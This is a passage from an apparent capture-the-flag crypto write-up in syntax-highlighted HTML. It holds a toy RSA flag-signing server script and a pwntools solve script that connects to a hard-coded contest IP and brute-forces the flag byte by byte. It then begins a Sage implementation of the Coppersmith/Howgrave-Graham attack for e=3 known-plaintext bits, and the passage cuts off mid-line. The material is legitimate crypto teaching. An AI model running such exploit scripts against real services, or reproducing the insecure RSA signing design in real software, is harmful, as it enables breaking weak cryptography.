punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span>    <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span>    <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span>    <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>    <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>    <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span>    <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>    <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span>    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span>    <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span>    <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span>    <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span>    <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span>    <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>    ret <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> y <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> y <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token punctuation">(</span>ret <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">%</span> z        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">%</span> z        y <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> ret<span class="token keyword">def</span> <span class="token function">welcom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># signal.alarm(5)</span>    <span class="token keyword">print</span> r<span class="token triple-quoted-string string">""" ____  ____    _      ______   ______ _____ _____ __  __ |  _ \/ ___|  / \    / ___\ \ / / ___|_   _| ____|  \/  || |_) \___ \ / _ \   \___ \\ V /\___ \ | | |  _| | |\/| ||  _ &lt; ___) / ___ \   ___) || |  ___) || | | |___| |  | ||_| \_\____/_/   \_\ |____/ |_| |____/ |_| |_____|_|  |_|"""</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    welcom<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_len <span class="token operator">=</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>flag_len <span class="token operator">==</span> <span class="token number">38</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> pad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token triple-quoted-string string">'''1. sign flag2. get signed flagPlease give me your choice :'''</span>        cmd <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            <span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">256</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> unpad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>flag_len<span class="token punctuation">]</span> <span class="token operator">+</span> raw_input<span class="token punctuation">(</span><span class="token string">'Please sign your flag (0 - %d): '</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> flag_len<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">256</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> pad<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'Success'</span>        <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            signature <span class="token operator">=</span> mul<span class="token punctuation">(</span>str2int<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'Your signed flag ciphertext is : 0x%x'</span> <span class="token operator">%</span> signature        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'Bye bye'</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>solve.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token comment" spellcheck="true"># context.log_level='debug'</span>ip<span class="token operator">=</span><span class="token string">'123.59.138.211'</span><span class="token comment" spellcheck="true"># ip='127.0.0.1'</span>ppp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token number">0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92F</span>e <span class="token operator">=</span> <span class="token number">0x10001</span><span class="token keyword">def</span> <span class="token function">str2int</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> int<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">s1</span><span class="token punctuation">(</span>fff<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'):'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>fff<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">s2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice :\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'is : '</span><span class="token punctuation">)</span>    t<span class="token operator">=</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print('t',t.replace('\n',''))</span>    <span class="token keyword">return</span> tflag<span class="token operator">=</span><span class="token string">"f"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">23333</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># p.interactive()</span>    s1<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">218</span><span class="token punctuation">)</span>    s1<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    c<span class="token operator">=</span>s2<span class="token punctuation">(</span><span class="token punctuation">)</span>    m<span class="token operator">=</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> tm <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m<span class="token punctuation">[</span>ppp<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>flag<span class="token punctuation">[</span>l<span class="token punctuation">]</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m<span class="token punctuation">[</span>ppp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>chr<span class="token punctuation">(</span>jj<span class="token punctuation">)</span>        kkk<span class="token operator">=</span><span class="token string">""</span>        <span class="token keyword">for</span> mm <span class="token keyword">in</span> m<span class="token punctuation">:</span>            kkk<span class="token operator">+=</span>mm        kkk<span class="token operator">=</span>str2int<span class="token punctuation">(</span>kkk<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span>kkk<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>int<span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>jj<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>haved knowed high bits of Plaintext<br>with e=3,you can use Coppersmith theorem to find it with a log(n) algorithm.<br>you should use it in sage.(in sage cloud is ok)</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> timedebug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token keyword">def</span> <span class="token function">coppersmith_howgrave_univariate</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> beta<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Coppersmith revisited by Howgrave-Graham    finds a solution if:    * b|modulus, b >= modulus^beta , 0 &lt; beta &lt;= 1    * |x| &lt; XX    """</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># init</span>    <span class="token comment" spellcheck="true">#</span>    dd <span class="token operator">=</span> pol<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span>    nn <span class="token operator">=</span> dd <span class="token operator">*</span> mm <span class="token operator">+</span> tt    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># checks</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token number">0</span> <span class="token operator">&lt;</span> beta <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"beta should belongs in (0, 1]"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> pol<span class="token punctuation">.</span>is_monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ArithmeticError<span class="token punctuation">(</span><span class="token string">"Polynomial must be monic."</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># calculate bounds and display them</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token triple-quoted-string string">"""    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)    * we know LLL will give us a short vector v such that:    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)    * we will use that vector as a coefficient vector for our g(x)    * so we want to satisfy:    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)    (it's important to use N because we might not know b)    """</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># t optimized?</span>        <span class="token keyword">print</span> <span class="token string">"\n# Optimized t?\n"</span>        <span class="token keyword">print</span> <span class="token string">"we want X^(n-1) &lt; N^(beta*m) so that each vector is helpful"</span>        cond1 <span class="token operator">=</span> RR<span class="token punctuation">(</span>XX<span class="token operator">^</span><span class="token punctuation">(</span>nn<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* X^(n-1) = "</span><span class="token punctuation">,</span> 